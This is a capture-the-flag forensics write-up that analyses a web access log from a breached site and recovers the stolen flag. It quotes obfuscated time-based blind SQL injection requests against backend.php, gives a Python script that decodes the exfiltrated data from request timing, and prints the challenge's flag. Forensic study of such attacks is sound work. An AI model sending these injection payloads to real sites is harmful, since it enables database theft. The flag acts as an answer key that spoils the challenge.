# We got breached again

## Challenge Details

- Category: Forensics
- Points: 6
- Validation: 187
- Author: Mr.Un1k0d3r
- Status: Done
# Handout
`We got breached; again Like SONY we didn't learn from our mistakes. They steal one of our flag!`
https://ringzer0ctf.com/files/3e616da92a16f60b2d03ef82213c190e.zip
## Walkthrough
Is that a geohotz reference?
Unzipping:
```bash
$ unzip 3e616da92a16f60b2d03ef82213c190e.zip
Archive:  3e616da92a16f60b2d03ef82213c190e.zip
  inflating: access.log
```
Finally something that isn't a pcap file :p
Too bad this is almost exactly the same as breached part 1, we are again dealing with a blind sqli, evident from:
```
10.0.1.1 - - [01/Mar/2015:13:19:05 -0500] "GET /backend.php?user=admin%27%20AND%20IF%28/%2AhzVTU%2A/SUBSTRING%28REVERSE%28/%2AIVcGvi6%2A/CONV%28HEX%28SUBSTRING%28/%2A5KlQOghoNV%2A/%28SELECT%20GROUP_CONCAT%28CONCAT%28flag%29%29%20FROM%20chart_db.flag/%2Av8VwgM%2A/%29%2C33%2C1%29%29%2C16%2C2%29%29/%2Ail%2A/%2C7%2C1%29%3D1%2CSLEEP%282%29%2C4353338%29%20AND%20%27343 HTTP/1.1" 200 432 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0"
10.0.1.1 - - [01/Mar/2015:13:19:05 -0500] "GET /backend.php?user=admin%27%20AND%20IF%28/%2A3x%2A/SUBSTRING%28REVERSE%28/%2A4L8bt7%2A/CONV%28HEX%28SUBSTRING%28/%2AWIDaSdPh7%2A/%28SELECT%20GROUP_CONCAT%28CONCAT%28flag%29%29%20FROM%20chart_db.flag/%2AyJFr1Okoaha%2A/%29%2C34%2C1%29%29%2C16%2C2%29%29/%2AxVHY%2A/%2C1%2C1%29%3D1%2CSLEEP%282%29%2C4249%29%20AND%20%27585 HTTP/1.1" 200 431 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0"
```
The timing is key here, we see a 2 second sleep or more when the sqli succeeds, and 0 second gap when it fails, kind of like a side channel.
```python
import re  
from datetime import datetime  
from urllib.parse import unquote  
from collections import defaultdict  
  
queries = []  
flagbits = defaultdict(lambda: defaultdict(dict))  
  
sqlcomm = re.compile(  
r"SUBSTRING\(REVERSE\(CONV\(HEX\(SUBSTRING\("  
r"\((.*?)\),(\d+),1\)\),16,2\)\),(\d+),1\)=1,SLEEP\(2\)"  
)  
  
for line in open("access.log", errors="ignore"):  
line = unquote(line)  
line = re.sub(r"/\*.*?\*/", "", line)  
  
m = sqlcomm.search(line)  
if not m:  
continue  
  
time_text = re.search(r"\[(.*?)\]", line).group(1)  
time = datetime.strptime(time_text, "%d/%b/%Y:%H:%M:%S %z")  
  
sql = m.group(1)  
i = int(m.group(2))  
bi = int(m.group(3))  
  
queries.append((time, sql, i, bi))  
  
for n in range(len(queries) - 1):  
time, sql, i, bi = queries[n]  
next_time = queries[n + 1][0]  
  
sleeptime = (next_time - time).total_seconds()  
  
flagbits[sql][i][bi] = sleeptime >= 2  
  
for sql in flagbits:  
print(sql)  
  
flag = ""  
  
for i in range(1, max(flagbits[sql]) + 1):  
c = 0  
  
for bi in range(1, 8):  
c += flagbits[sql][i].get(bi, 0) << (bi - 1)  
  
if c:  
flag += chr(c)  
  
print(flag)  
print()
```

```bash
$ python3 solve.py
SELECT database()
chart_db@

SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA = 0x63686172745f6462
flag,

SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167
flag@

SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag
FLAG-oz5K5V60LjG92O498I2G921Qj87480og
```
and there it is!
# FLAG
FLAG-oz5K5V60LjG92O498I2G921Qj87480og